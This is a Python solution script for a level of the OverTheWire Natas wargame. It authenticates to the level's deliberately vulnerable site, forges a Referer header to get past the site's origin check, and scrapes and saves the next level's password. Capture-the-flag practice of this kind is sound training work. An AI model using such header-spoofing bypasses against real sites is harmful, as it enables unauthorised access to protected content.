import os
import requests

from bs4 import BeautifulSoup, Tag

from bs4 import ResultSet

import pathlib

file = os.path.basename(__file__).split(".")
file = file[0]
file = file[file.find("natas")+5:]

level = int(file)

username = f"natas{level}"
password = None
website = f"http://{username}.natas.labs.overthewire.org/"

result = None

with open(f"./natas/password/natas{level:02}-password.txt", "r") as f:
    password = f.read()

def natas_connect(website: str, username: str = None, password: str = None, params: dict = None, headers: dict = None, get_body: bool = True) -> Tag:
    print(f"Connecting to {website}")
    
    if username and password:
        print(f"Username : {username}")
    
    if username and password:
        print(f"Password : {password}")
    
    print()

    r = requests.get(website, auth=(username, password), params=params, headers=headers)

    print("Parsing HTML", end="...")
    soup = BeautifulSoup(r.content, "html.parser")
    print("Done\n")

    if get_body:
        print("Retrieving <body> tag", end="...")
        body = soup.find("body")
        print("Done\n")
    else:
        body = soup


    print(body)
    print()

    return body

def save_password(result: str, level: int = level) -> pathlib.Path:
    result = result.strip("\n")

    print(f"Password found : {result}\n")

    dir = f"./natas/password/natas{level+1:02}-password.txt"

    print(f"Saving to file {dir}", end="...")
    with open(dir, "w+") as f:
        f.write(result or "")
    print("Done")

    print()

    return pathlib.Path(dir)

def join_website_dir(website: str, *dir: str) -> str:
    dir = map(str, dir)

    res = website.strip("/")

    for d in dir:
        res += "/"
        res += d.strip("/")

    return res

def find_element(element: str, soup: BeautifulSoup | Tag , all: bool = True) -> Tag:
    print(f"Finding <{element}>", end="...")
    res = soup.find(element)
    print("Done\n")
    
    return res

body = natas_connect(website=website, username=username, password=password)

body = natas_connect(website=website, username=username, password=password, headers={"referer": "http://natas5.natas.labs.overthewire.org/"})

content = body.get_text()
content = content.splitlines()
content = [*filter(lambda c: c, content)]

content = content[1]
content = content.split()
result = content[-1]

password_dir = save_password(result=result)